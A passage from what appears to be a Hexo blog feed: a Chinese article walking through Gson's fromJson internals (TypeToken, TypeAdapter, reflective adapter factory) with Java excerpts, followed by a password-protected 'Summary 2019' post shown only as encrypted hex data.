开发过程中，遇到需要和后端进行数据交互的时候，数据之间的传输往往就是 JSON 格式，为此，Google 爸爸为我们提供了一个开源的库叫 Gson，用于进行 Json 的解析和生成。</p><p>　　Gson 本身的用法比较简单，给我们两个非常直接的方法 fromJson 和 toJson 来帮助我们实现 Java 的数据类和 Json 格式之间的转换。由于其用法本身十分简单，这里不进行介绍，今天，我们尝试着一起来看一下，Gson 这个库究竟是怎么实现的。</p><p>　　首先，还是先看一下 Gson 是怎样进行解析的吧。</p><h3 id="fromJson"><a href="#fromJson" class="headerlink" title="fromJson"></a>fromJson</h3><p>　　首先，点进 fromJson 方法。注意，这里有参数为 Type 的类型，这是 Java 中所有类型(包括基本类型)都实现的接口，位于反射相关的包当中。<br>　　可以看到，fromJson 有很多个重载，最后所有的重载都调用了一个方法:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T&gt; <span class="function">T <span class="title">fromJson</span><span class="params">(JsonReader reader, Type typeOfT)</span></span></span><br></pre></td></tr></table></figure><p>　　其中，JsonReader 是 Gson 库中对 Reader 的一个包装，我们可以先把它简单的看成是一个可以读取 Json 字符串的黑匣子即可。typeOfT 即泛型变量的类型。在这个函数中，最关键的几行为:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    TypeToken&lt;T&gt; typeToken = (TypeToken&lt;T&gt;) TypeToken.get(typeOfT);</span><br><span class="line">    TypeAdapter&lt;T&gt; typeAdapter = getAdapter(typeToken);</span><br><span class="line">    T object = typeAdapter.read(reader);</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>　　由于上面用到了 TypeToken 和 TypeAdapter 两个类，我们需要先来看一下这两个类究竟在做一些什么。</p><h3 id="TypeToken"><a href="#TypeToken" class="headerlink" title="TypeToken"></a>TypeToken</h3><p>　　顾名思义，TypeToken 这个类的出现，主要是为了解决泛型的类型擦除问题。利用反射的方式，获得泛型的信息。至于类型擦除出现的原因，如果不太清楚的话建议先去了解一下再继续看。<br>　　<br>　　通常，在解析含有泛型信息的类的时候，我们会类似这样写:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">List&lt;String&gt; model = gson.fromJson(jsonStr, <span class="keyword">new</span> TypeToken&lt;List&lt;String&gt;&gt;()&#123;&#125;.getType());</span><br></pre></td></tr></table></figure><p>　　TypeToken 中的变量如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TypeToken</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line">  <span class="keyword">final</span> Class&lt;? <span class="keyword">super</span> T&gt; rawType;</span><br><span class="line">  <span class="comment">// Type 类位于 Java 反射包当中，Java 是所有类型的一个 "超接口"</span></span><br><span class="line">  <span class="comment">// 可以是原始类型，包括 int 等，也可以是含有泛型信息的类</span></span><br><span class="line">  <span class="keyword">final</span> Type type;</span><br><span class="line">  <span class="keyword">final</span> <span class="keyword">int</span> hashCode;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">protected</span> <span class="title">TypeToken</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.type = getSuperclassTypeParameter(getClass());</span><br><span class="line">    <span class="keyword">this</span>.rawType = (Class&lt;? <span class="keyword">super</span> T&gt;) $Gson$Types.getRawType(type);</span><br><span class="line">    <span class="keyword">this</span>.hashCode = type.hashCode();</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>　　type 变量表示 T 的实际类型(包含泛型信息)，rowType 变量则表示 T 泛型擦除后的信息。比如 TypeToken&lt;String>(){} 的 type 和 rawType 均为 java.lang.String 而 TypeToken&lt;List&lt;String>>(){} 的 type 为 java.util.List&lt;java.lang.String>，而 rawType 为 interface java.util.List。</p><p>　　捕获泛型信息的关键是 Class 类的 Type getGenericSuperclass() 方法，该方法可以获得某个类的父类的类型信息(包含泛型信息)。而为了获得父类的类型信息，我们使用匿名内部类来实现。</p><p>　　利用这个原理，我们可以这样来实现一个最基本的 TypeToken:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TypeToken</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line">  <span class="keyword">final</span> Type type;</span><br><span class="line">  <span class="function"><span class="keyword">protected</span> <span class="title">TypeToken</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.type = getSuperclassTypeParameter(getClass());</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function">Type <span class="title">getSuperclassTypeParameter</span><span class="params">(Class&lt;?&gt; subClass)</span> </span>&#123;</span><br><span class="line">    Type superClass = subClass.getGenericSuperclass();</span><br><span class="line">      ParameterizedType parameterizedType = (ParameterizedType) superClass;</span><br><span class="line">      <span class="keyword">return</span> parameterizedType.getActualTypeArguments()[<span class="number">0</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> Type <span class="title">getType</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> type;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    TypeToken&lt;List&lt;String&gt;&gt; token = <span class="keyword">new</span> TypeToken&lt;List&lt;String&gt;&gt;()&#123;&#125;;</span><br><span class="line">    System.out.println(token.getType());</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="TypeAdapter"><a href="#TypeAdapter" class="headerlink" title="TypeAdapter"></a>TypeAdapter</h3><p>　　解决完 TypeToken 后，接下来我们来看一下 TypeAdapter 是做什么的。</p><p>　　点进 TypeAdapter 类，我们可以看到，这是一个抽象类，包含两个抽象方法(以及许多其他相关的非抽象方法，这里忽略):</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">TypeAdapter</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">write</span><span class="params">(JsonWriter out, T value)</span> <span class="keyword">throws</span> IOException</span>;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> T <span class="title">read</span><span class="params">(JsonReader in)</span> <span class="keyword">throws</span> IOException</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>　　可以看到，这个类就是 Gson 实现序列化和反序列化的核心了。回到一开始的 fromJson 中的几行关键代码，整个 Deserialization 的流程就可以简化为:</p><ol><li>根据所给的字符串，创建一个 JsonReader 类，用于读取字符串中的数据(或自己提供一个 JsonReader)</li><li>将我们给的类强转为 Type，并使用 TypeToken 捕获包含泛型信息在内的类型信息</li><li>使用创建的 TypeToken，创建 TypeAdapter，提供 Type 和其对应的 Java 类的一个适配。同时这里我们也可以知道，Type 和 TypeAdapter 存在一一对应的映射关系</li><li>进行适配操作(read)，得到一个类型为 Type 的 Java 对象</li></ol><p>　　因此，接下来，我们只需要弄清楚 TypeAdapter 是在干什么就可以了。上文中，TypeAdapter 是 getAdapter 方法返回的对象，这里，我们可以来简单看一下这个方法:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T&gt; <span class="function">TypeAdapter&lt;T&gt; <span class="title">getAdapter</span><span class="params">(TypeToken&lt;T&gt; type)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 这里从名字就可以看出，这里是对 TypeAdapter 做的一个缓存</span></span><br><span class="line">  TypeAdapter&lt;?&gt; cached = typeTokenCache.get(type == <span class="keyword">null</span> ? NULL_KEY_SURROGATE : type);</span><br><span class="line">  <span class="keyword">if</span> (cached != <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> (TypeAdapter&lt;T&gt;) cached;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 这里的 calls 是一个属于线程的变量，因此可以避免多线程造成的问题</span></span><br><span class="line">  Map&lt;TypeToken&lt;?&gt;, FutureTypeAdapter&lt;?&gt;&gt; threadCalls = calls.get();</span><br><span class="line">  <span class="keyword">boolean</span> requiresThreadLocalCleanup = <span class="keyword">false</span>;</span><br><span class="line">  <span class="keyword">if</span> (threadCalls == <span class="keyword">null</span>) &#123;</span><br><span class="line">    threadCalls = <span class="keyword">new</span> HashMap&lt;TypeToken&lt;?&gt;, FutureTypeAdapter&lt;?&gt;&gt;();</span><br><span class="line">    calls.set(threadCalls);</span><br><span class="line">    requiresThreadLocalCleanup = <span class="keyword">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// FutureTypeAdapter 顾名思义，它是用来表示一个正在进行当中的调用</span></span><br><span class="line">  <span class="comment">// 是其他 TypeAdapter 的一个代理。作用是防止同一个 Type 的递归调用，</span></span><br><span class="line">  <span class="comment">// 导致栈溢出。可以考虑一下类 A 中含有类 A 的情况。</span></span><br><span class="line">  <span class="comment">// 这点很关键，要理解好，不太理解也可以先跳过</span></span><br><span class="line">  FutureTypeAdapter&lt;T&gt; ongoingCall = (FutureTypeAdapter&lt;T&gt;) threadCalls.get(type);</span><br><span class="line">  <span class="keyword">if</span> (ongoingCall != <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> ongoingCall;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    FutureTypeAdapter&lt;T&gt; call = <span class="keyword">new</span> FutureTypeAdapter&lt;T&gt;();</span><br><span class="line">    threadCalls.put(type, call);</span><br><span class="line">    <span class="keyword">for</span> (TypeAdapterFactory factory : factories) &#123;</span><br><span class="line">      TypeAdapter&lt;T&gt; candidate = factory.create(<span class="keyword">this</span>, type);</span><br><span class="line">      <span class="keyword">if</span> (candidate != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 成功创建 TypeAdapter，设置代理，并添加缓存后返回</span></span><br><span class="line">        call.setDelegate(candidate);</span><br><span class="line">        typeTokenCache.put(type, candidate);</span><br><span class="line">        <span class="keyword">return</span> candidate;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>　　可以看到，TypeAdapter 应该是由 TypeAdapterFactory 这个类(接口)生成的，这是一种典型的工产模式。接口为:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">TypeAdapterFactory</span> </span>&#123;</span><br><span class="line">  &lt;T&gt; <span class="function">TypeAdapter&lt;T&gt; <span class="title">create</span><span class="params">(Gson gson, TypeToken&lt;T&gt; type)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>　　通过查找 factories，我们可以看到，这是一个在 Gson 对象的构造函数里面创建的一个 unmodifiableList。构造方法里，直接”暴力”地添加了所有类型的对象对应的 Adapter，然后在 create 方法中，如果 type 和对应的 Factory 是匹配的，就可以返回。(这里其实甚至可以添加用户自定义的 Factory，且优先级是很高的)</p><p>　　实际使用 Gson 的时候，我们需要反序列化的通常都是自己定义的数据类，定位到 TypeAdapterFactory，对应的就是 ReflectiveTypeAdapterFactory。这里我们不妨看一下它对应的工产方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span> <span class="keyword">public</span> &lt;T&gt; <span class="function">TypeAdapter&lt;T&gt; <span class="title">create</span><span class="params">(Gson gson, <span class="keyword">final</span> TypeToken&lt;T&gt; type)</span> </span>&#123;</span><br><span class="line">  Class&lt;? <span class="keyword">super</span> T&gt; raw = type.getRawType();</span><br><span class="line">  <span class="keyword">if</span> (!Object.class.isAssignableFrom(raw)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>; <span class="comment">// it's a primitive!</span></span><br><span class="line">  &#125;</span><br><span class="line">  ObjectConstructor&lt;T&gt; constructor = constructorConstructor.get(type);</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> Adapter&lt;T&gt;(constructor, getBoundFields(gson, type, raw));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>　　前面几行判断 type 是不是原始类型，是的话就有问题(Type 和 Factory不对应)，返回空。下面的 ConstructorConsturctor 从字面意思看也很明显，就是构造器的构造器，给定一个 Type 变量，返回一个 Type 类型的构造器，具体的实现方式就是反射，这里不再进入细节。后面一行就是创建 Adapter 了。这里又用到了一个 getBoundFields 方法。</p><p>　　首先是 BoundField 类，这个类比较简单，一个 BoundField 和一个内部的变量相对应，用于判断每个变量是否需要进行序列化和反序列化。getBoundFields 返回一个 Map，即所有的变量和其对应的 BoundField 的集合。</p><p>　　其次是 Adapter 类，这是 ReflectiveTypeAdapterFactory 的一个静态内部类，实现了 read 和 write 方法。这样，我们只需要在 read 中一一读取各个变量，然后调用 BoundField 的 read 方法，读取变量并赋值。最后再把 instance 返回，就完成了整个解析的过程了。</p><p>　　至于其他类型的反序列化过程，做法是类似的，可以通过查看对应的工厂类方法查看。这里不再赘述。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span> <span class="function"><span class="keyword">public</span> T <span class="title">read</span><span class="params">(JsonReader in)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  T instance = constructor.construct();</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    in.beginObject();</span><br><span class="line">    <span class="keyword">while</span> (in.hasNext()) &#123;</span><br><span class="line">      String name = in.nextName();</span><br><span class="line">      BoundField field = boundFields.get(name);</span><br><span class="line">      <span class="keyword">if</span> (field == <span class="keyword">null</span> || !field.deserialized) &#123;</span><br><span class="line">        in.skipValue();</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        field.read(in, instance);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">  in.endObject();</span><br><span class="line">  <span class="keyword">return</span> instance;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>　　至于 toJson 方法，实现方法相对更简单一点，而且也不是这篇文章的中心，因此这里就不再细写。</p><h2 id="Epilogue"><a href="#Epilogue" class="headerlink" title="Epilogue"></a>Epilogue</h2><p>　　这篇文章主要简单地介绍了 Java 的序列化，以及简单地介绍 gson 库的实现，总的来说，gson 主要是使用反射来实现反序列化的。有几个比较注意的点，一个是使用反射获取包含泛型信息的类的信息，另一个是使用 TypeAdapter 实现 Type 和对应的 Java Bean 的映射，并使用反射，获得构造器并创建对象，最后依次对各个变量进行赋值，递归进行则可以得到我们要的对象。不过一个需要注意的问题是，由于需要用到反射，这样的写法效率上还是有些低的。</p><p>参考资料:</p><p><a href="https://blog.csdn.net/jiangjiajian2008/article/details/53314084" target="_blank" rel="noopener">https://blog.csdn.net/jiangjiajian2008/article/details/53314084</a></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Serialization </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Summary 2019</title>
      <link href="/2019/12/30/summary-2019/"/>
      <url>/2019/12/30/summary-2019/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="e9abdc3716669880b874c4aae95b1c126df7711ac517cc5e00e42108ac175ec0">061970828125efd4531ee3538f07105b0ee9d58408c879cafdcde0ff4e0c904e98e390b6e82790030d5bb1393d1e299fc040c44c314f0506a6941496e9ca4f24a6b332d9b248d3a4b585d652c1fbbd6e9376285d8bc567a033851a040dde5743507e971fd1231fc3a4ea01cf76245b908fbbf4d1434dd50144ddd34ae5bf856ec257338f806942db01369012881a6e2c1ad9d4cd8e3bbae64698f1360764c85c3ffc1bc93e5adf5abffc0a1704fcb552642a511d69788418846d33e3cf8867afc9359ec6b9b1a66f63da6db9bd63ccca1a8bdf9b7613c6eba57e484b76a56023a5eeeeeed293498a0fd24be59b52c7822bed55d9beef1d8f8c39d176bd82af8b186e28823866a9a7fedbcc36d0726c8f15643151e98b920ec8f3151d972e25cf1234522af33c285b6e1207f14af1dcace1078e5e9b7eada9429868bb58aa4dcc24f330fb0f0d1a57b0c7761e4c278df146746b330f34fcb1eacd20520dc2f3ff2d3011309fe89cb7567a5c0d6a7fb9d378654a70842ff6ab2a7fc767604b89870c6a88efe7070198ec85de96c30674eaf92066480796af56161dd5823192aa1f74c4bf9c63c1b23895c2cad1cb3a408d99eed6bc74428a4b5d7acd6b82f6ad6904ecc81ffdc1d261c13fd9dab331c9e3551aba6a05c12d5a1c8d6473bf083b509056693b6b082d5e9d0e1137be16cd046c25ec9c29f1f65a46d6c5b2629b8604a79ac549762593323fb3e5c54630aa2c0e3dcf6c5ba3a514dfd3c4b6ba26575867f56dd55b0b0e18b2610ab7db41e801b0a04db4cb865cb4f662958f6e05f6adde7cd6b9224fcac3d1c35d0eca6d35be084b01edbceb4122075ea8eef6703b4096fb66b10d5088729a20381fef9fe1d226d668a7e17493934a1c43f8a256a2e18b7b272a8cb6b120cb1983e39cd6f41cb4ec9b6051ea8adc872e703a01d1acc30dcbc385c667445c2c40abcfbd4a5930232b81cedaf25e271e0224bf2eaa6eba5502252cf63ddfc9d2d6ed0309e11f4c88b128c33a70e3eb744c2be0107f62108d476a6e015f7bfd99a63ed652b8b8e4633768a8995c567b8c5db6f8b143b5a156da1ffad09376439b138e59829f689b64538eed064016ac8011cc5f3c1e586945d8f5135f38bd264a7c0cad9c922549d8b45f88ce7410fff4ca3249c3ec9577662c3b4bf017bed8130e00a813c15d84231a2484f7f43b694fb19698a687dc3eb48ef92d992d989afc14837b7c2a109a38ba97200faf866610e5c1265e78e88b93d81727d8853b8222753e6c6c29c93739bde027d549f07de132747377ae628535a12203b5494a11c0a78ed30fdb5ec29ecfadf3e70926a3917d720239534a742a4ed0b3c2da4d7ba41930be20ea51c10880cf50e3a6f8ae564265a96e2ec38576561d3d7dcf1d2a3c18a60ddaee9dfb33392e459bb48f9546f88aaf0c0a8e853ec0eda68def53bf9fae755ed212773e86b1b80c7101c3779051d29d66f0f70d60920d6f382e529359193d508c02f4cbd5781601f3aacc31fe6643575cf90b36200891641625e4495ee1eb18e26c871326126fce798db044542b6ffefb85b00a4fc09f303446d55ba09b28709d4b50735837f1551b01274a421c4e3be4870c4d0b6cdb4db372f40686f683697d94770c2fbaf9c180801b1be5677fe5aad06995541cee91116293e5e0ae11324a5b6014bb66024b714ceb75753104dd5e248ddfa7f21937ead4902631e35f7d6d6c0d2036ee551ff378508f77d42bd89d44827eaebba7a8e705339c057fc26833cf54c16910a08e232cf1d59636d12632413b87de39c017fb159f505d7d49eaa361baee19aea02f4cf66e75fd71488435b7b7d025c6eaca0bdac8f54b165c6107674030a9a0431cfdcbafdfee3594fa97235d684e4e2d8cefe90e3ec09120a0e1963c44df8fb6e953116b3f52ceb9ae31e5ec69c71d8175a29eb1f2a8699d2a006accb16626b53753c15a3ac0fd669da75c4c3958cf4115e6508e60f6b7393e86e135c3ab134acde9812ddcb0c6941c00e64fcea9c4eb6be4038ca24d3fb51cfb795592957dc59086b4b70ed0e6fce379a71761d1ece7acd096a96ff37dcc3e949146e628640a07987aa36eaaf224f42a8f86750d24511f6324a35ca10da523e7266caf280e1a190d963ccba8fa62504ddd1a99f8241b8f52b70d7e0ef82001818e02155ee6e3519ea79fbe0e667938193cd02189705ffc99f078b42ed7be13d2521b30b22084b6d7b147e4c59e1aa79ca4f7a88e60c3d8f9a929dfd971b5ff381052c44a9c32800d599592f7da8b451cc9fcb3a3eef313d3b5968c3e48a6245992c0e51c787e43fa86ef0dc38c3230cfb8d6f90b7405d8480d996769ed690fef017262b8f29b9086e647f89dd64087438e2adfee42466492eaa4baaa32d3b954f66e06e2b861721ca22115a57d97d003f9caf3291452d8c13af952e690f0ba774bfb48c7217df90bda3c22907d93b331df5b470d1dd15a94ce8072fb7b49fe81564b402f9d13fd6d155b20aa1511ffd0fd9cc271653925e2f267934c6196df752b566f29cb59597fd6b5ce40aa1d3b23634f6924d2bc058cc8499e4cfae08a9d277481547250cfcd169b4d02bec688e72f532365ebeeeea35e91092a5b1e524f971b51b018e87578b024f88523565cd8ce025835b0fbbd18df85b9109afdfe43f72d6e7c67395546c912728ace7948fc46fea1e8b52f37f61a1aaecee140c7103bee1dd907d3b1038d6eb703470de6442ca9d1fe283bde4d03764758460d57b19004897cde491edc2f124862dfd9e5f48b4401b377f9dadd05d0f841e0f7e2421b75f76d9baf445debd5fb1f7042ce060ff1080508f1a70c07506b404661526a12285abe4cdbfca43d4cbfad6ca59543aabdf20aafcf339b024de5779a99c4ee43a1898f78032638ca1896797a5bc6ca4528199139b732f450f41463b02818ade924285789631cb8d2f3ef6c562647edbea4abd26243028c137ab0ebb68bbe2301af2ac0389e40a6b16ef406dde7699dc8fa871bf61e7ec8197758caec2aa7e931a9850807c7d721f1d65e60a0ce8fda9562a4cdff833331d383515039fdb225f6a11bd6273d7c7691f79034853b385bd7b96acb78e4a6c364aed6072fb3a0cba3bcb9e13787bdc8c879bb239d3fe1d7d11db5a6614eb997c7c96cdecaafba55a327d400ae91414804b28554e2b9226535e176898b532cf4d5ddc5dc88cfd0e0634c712fe5aadad3887bb2ae85216550bbf272b29b8710a6b2c1c50759d86fa2774b6aca9cb2da10e1c21575c712eb63d05a416befb40e7dfde9f11cf2d5310bf23686a07c481e60abd0378c7b9e0571965c092e02a44aff048dee26778717921dcf1544d7f4882b4286f3d78bd9518d9b40166d11d2532dfb1f3795123d8469f9fcc3793f57f2aaee91cc5df3f6e0fb4017b7a7a8992529872e2d1874c91b5aba6ab8c23de174c49799e153ede74e0a5c355d6193297baac3083bff0a32a8ee4e25c4b0237e1b8e0a7fb3041dc1ac8e94fa42fcead2395990293014b7d09f113dcce2ab4154210ca19ebc2c69ef0ded3797a39cb4611fe8e7bc208ba92022b6e7216e32792c4ee0a82f35b197f8f1356424bb424e3e7543ed6287562ab8422cd0458c7237f9370618dcc2a3d412de30b238b5019ff060edc5c489bd75d730d5c7a569da85ae53f23f955258b0e5a52076b10d1a2277507cdc0a1639bbb45a125f79b7a5f4a4af9b8b6c5d9e2599935c3abde527a20f9e34a25d39c991ed829132fb73a24c94a4a18c9d4f55dcb251fa249743421387152a1528f09ac73933cacab38d44b900a52e94da200c20f7d75c7501678f012334aba6e4a0165e17c840adf0f813f9f005c6f889c6ba93aba7dfe3b33ec9c25d848994ef568145a9d592cdba419040530a8f0c8718bb2178f3d8a30b16aa7b6192ff2d906d3e5c5e125c1c837f168855be04c54fbd5b1df8b9bebf56082c9290806edd0c75497edb0e121e1c1fc9222d578dff5045dd7750842941ecb97c853adbaf00e5bdb4ec2cd8526e40d06a36147665270e549d3fb06ce2506c327f0b29e83be97a6486bc58e430f054608f62af4e89df47411009c08c27e0cf2ab2b805a5f40d8f38ab04e4741d6089a6f61bf3f076befc5deca691bc17c0bfb0fdfe092a6fb69142286b060234176cc2f92d873d9befe61ba3d2e5a3d3418124f9aa64c7b2abc8fcbf8ee361239d9320efe234468405fb8915df71eb71d0c2107fa6e260e7ff78812db25bc48e54e703ecaf8cd9aa017311a82c5a727eaf9c9b70dedbae837fa4b32d77af1bc9daa7e61af0410d3ac1ae18daaeb1d77d521f751d3c83d3fba07879bd9dc2548890fa751b1ce133a82721eb5dd1a0ae865449979175a2a9b94fa1736c9676d0034121017a83afa14006bc901f97bb079dfc79c255e607712da15a55eba8cd554a562de6c64d4bb7f0738297702c71ff8ab696212e26a9adaf7f28dd8c1f5fcd2a7b3964beb327aec303dce1d9d1ae550864586d82a7f77df507117b24060d0fd63819ec5d219884fb8e76cf28226ec07758a24361435e9ee01fccf41ca32da97f04c6a15093ed356f33be573145d893b9e64035fa39225b531b3bc2ab392fd1ded9743897e7281eb1fd7118a868a9704142566cfe49302c545b77ca26735895514b4c242f82d29ee63f10ce2d11bbe34ec67a317aa31ef500864d18a7c0ed046f67f4516bc4ce6c8d7d890fc9105a2c181b9ee9bcec5c86c549394401b48f67f080b590998640389545c7810288cb2f750a6322acd2e19d4fe473db57bc9858c7d7a389530ced19372ecda79b3b99b9605bbb7d2972c04a66641e39837acc4e9656b9fc06ecacecc707f7c93680e32e36607dc4c900f3d17562e01a5dbaed628ff3f057e4aee9ec9aec3531a0f791c41238944fdae99e1273747d38b6bc1dcea75b6d23b35dff81a6e77ae92bcd539cccbfbbb9a0968c0cae4a36ba4ae9213feea1e270317f2c9067e6aa0b7186aad99f9fa728c1094c87223766658ff2dffb1d5163575bcc148e8ff89fa70f081a88e2bdfdfcab38184e3a5ccfb90ebf2ca5eaff504f9c3175b364f39796758477528f3c5e31fe39887906d9add72c18241628cf32ca8dcbc537eb4ab8b4da6d2125ce2df35d79e2fe3c9ac72c423351ab7a88cd872ac3e125e060c368bcaf2cefebc2660361199af3bab626f807f18d2eca8ad9ca29a1710a432d03a6829dbcee4d125960acec3344d8b15d3e812311007703e7b0ec5f0b29d73c1e4ea3633af80f1d0f8a7b3f26e9df452b457887a594c17f0bbf08d409a236ec96cb32e5a81e9b7899906f37bf390b10551e6cf8177a633e94360c9293551f9c83dcbe87838e2add15542a7b1a39c14172501805b2f16c1a546a644c38e9062a26a292c988e4232042fe5c8588867d6828f4a98840e2ebcd3496291586a1071d9618f9df44cd18e0e127949d3678bd37c11d01a19ba3ab081e7a6f80d8848c2818214c6653c39dd3cd6181d941708a00dab6f4c484c470bf8997267fdb5bf94077afaf0d69824a36799ff2e4c7a61cc623c7c896caf679521b14063c86dcc5de2b91f03ddacca4a1287a95decf75cbcf97fe8b531dc02037d4353de95774108167483be7e1c58c9e5afddc607fc7712ed943d5cd0690a70889c02dcc9131b469f142fc506c811884660586db873db675631a31636eeba9d6549adb456279326c035ac499a0a940fa145f2d8b0aa96c2637b2047c3c4992636108922b317b13de2280be7868aa3f2316c5288fc035447bfb591dbac36d7cd3786dd530abfd50adc69be1ebdd7515651386ee0eedb4520863292c9adc9fbb89f0e30fc27cdccbf786bc586b75a05372380335731db88e49f9194523a22779367f0f2a5367b8e1f628f8d476733478137cb8edd358eb8ab9c39315c42a1